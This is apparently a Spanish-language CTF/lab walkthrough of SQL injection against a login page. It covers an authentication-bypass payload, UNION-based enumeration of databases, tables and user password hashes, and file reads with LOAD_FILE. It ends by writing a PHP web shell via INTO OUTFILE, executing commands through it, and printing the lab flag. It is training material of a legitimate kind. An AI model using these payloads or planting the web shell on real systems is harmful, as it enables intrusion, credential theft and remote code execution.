![[Pasted image 20250118142139.png]]

Se nos da esta pagina, con un formulario de login, tras probar a hacer una inyeccion en los parametros, con:

* **User:** `admin' or '1' = '1'--`
	* **Password:** `' or '1' = '1'--`

podemos lograr acceder a la siguiente pagina
![[Pasted image 20250118142434.png]]
podemos ver que se muestra la información de 4 columnas, vamos a ver que información podemos sacar a raíz de esto:
1. **' ORDER BY--**
	 Si hacemos un `' ORDER BY 6--` podemos observar que no existe la columna 6
	 ![[Pasted image 20250118143023.png]]
	Pero si lo hacemos `' ORDER BY 5--` nos muestra la tabla, por lo que podemos determinar que la tabla mostrada tiene 5 parámetros, a partir de aqui podemos ver cuales son los que se están mostrando, y a raíz de esto poder realizar **UNION INJECTIONS** para recabar mas información.
	Ejecutando: `' UNION SELECT 1, 2, 3, 4,5 --`  podemos ver que las columnas que se muestran, son la 2,3,4 y 5
	![[Pasted image 20250118145951.png]]
	
	a raíz de esto vamos a sacar mas información de la DBSM
	 `'  UNION SELECT 1, schema_name, 3, 4,5 from information_schema.schemata--` 
	 ![[Pasted image 20250118150438.png]]
	 Podemos observar las siguientes bases de datos, vamos a ver en cual estamos trabajando actualmente con: 
	 `' UNION SELECT 1, DATABASE(), 3, 4,5-- -` 
	![[Pasted image 20250118150706.png]]
	podemos ver que estamos  trabajando en ilfreight, vamos a obtener las tablas de ilfreight con
	`' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ilfreight'-- -`
	![[Pasted image 20250118151010.png]]
	vemos que tiene dos tablas payment y users vamos a usar
	`' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -` para ver el contenido de estas
	![[Pasted image 20250118151207.png]]
	vamos a listar el contenido de username y password a ver q nos puede interesar
	' UNION SELECT 1, username, password, 4, 5 FROM ilfreight.users-- -
	![[Pasted image 20250118151348.png]]
	podemos observar a adam y el hash de su contraseña
	
2. **SUBIR WEB SHELL**
	Comenzamos identificando que usuario somos y q privilegios tenemos con:
	`' UNION SELECT 1, user, 3, 4,5 FROM mysql.user-- -```
	![[Pasted image 20250118151622.png]]
	
	`' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -`
	![[Pasted image 20250118151723.png]]
	se nos muestra que somos usuario root y tenemos superprivilegios. Sabiendo esto vamos a tratar de leer el codigo de dashboard.php mediante
	`' UNION SELECT 1, LOAD_FILE('/var/www/html/dashboard/dashboard.php'), 3, 4, 5-- -`
	y podemos observar el siguiente codigo
	``` php
<?php
session_start();

if ($_SESSION['login'] !== 1) {
    header("Location: index.php");
    die();
}

include "../config.php";

if (isset($_POST['search'])) {
    $q = "SELECT * FROM payment WHERE month LIKE '%" . mysqli_real_escape_string($conn, $_POST['search']) . "%'";

    $result = mysqli_query($conn, $q);

    if (!$result) {
        die(mysqli_error($conn));
    }

    while ($row = mysqli_fetch_array($result, MYSQLI_BOTH)) {
        echo "<tr>";
        
    }
}
```

	vemos que hace include a un archivo config.php, vamos a cargarlo a ver que podemos encontrar, tras ejecutar `' UNION SELECT 1, LOAD_FILE('/var/www/html/dashboard/config.php'), 3, 4, 5-- -` observamos q el archivo esta vacio. 
	viendo q $conn no esta definido vamos a definirlo
	```sql
' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "","" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

	Una vez accedemos a la shell y ejecutamos un 
	`http://94.237.63.163:30598/dashboard/shell.php?0=ls%20/`
	![[Pasted image 20250118160031.png]]
	vemos la flag y le hacemos un cat y obtenemos la flag
	
	528d6d9cedc2c7aab146ef226e918396 